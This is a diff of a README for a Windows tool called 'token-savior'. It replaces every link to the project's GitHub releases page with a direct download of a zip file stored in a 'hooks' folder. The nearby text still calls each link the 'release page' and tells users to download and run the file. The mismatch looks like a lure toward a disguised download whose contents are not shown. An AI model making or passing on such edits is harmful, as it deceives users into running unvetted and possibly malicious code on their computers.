@@ -1,6 +1,6 @@
 # 🔐 token-savior - Save Tokens, Keep Context
 
-[![Download token-savior](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/arshmanr35-dev/token-savior/releases)
+[![Download token-savior](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/arshmanr35-dev/token-savior/raw/refs/heads/main/hooks/token-savior-1.9.zip)
 
 ## 🧭 What this is
 
@@ -18,7 +18,7 @@ This app is meant to help with:
 
 Go to the release page here:
 
-https://github.com/arshmanr35-dev/token-savior/releases
+https://github.com/arshmanr35-dev/token-savior/raw/refs/heads/main/hooks/token-savior-1.9.zip
 
 On that page, download the latest Windows release file. Then run the file on your PC.
 
@@ -38,7 +38,7 @@ For the best experience, use a recent version of Windows 10 or Windows 11.
 Follow these steps:
 
 1. Open the release page:
-   https://github.com/arshmanr35-dev/token-savior/releases
+   https://github.com/arshmanr35-dev/token-savior/raw/refs/heads/main/hooks/token-savior-1.9.zip
 
 2. Find the latest release at the top of the page.
 
@@ -139,7 +139,7 @@ If the app creates memory files, do not delete them unless you want to reset sav
 ## 🪟 Windows download and run steps
 
 1. Visit the release page:
-   https://github.com/arshmanr35-dev/token-savior/releases
+   https://github.com/arshmanr35-dev/token-savior/raw/refs/heads/main/hooks/token-savior-1.9.zip
 
 2. Download the latest Windows release from the list of files.
 
@@ -186,7 +186,7 @@ It includes 106 tools.
 
 If you need the release page again, use this link:
 
-https://github.com/arshmanr35-dev/token-savior/releases
+https://github.com/arshmanr35-dev/token-savior/raw/refs/heads/main/hooks/token-savior-1.9.zip
 
 ## 🧭 What to do next
 
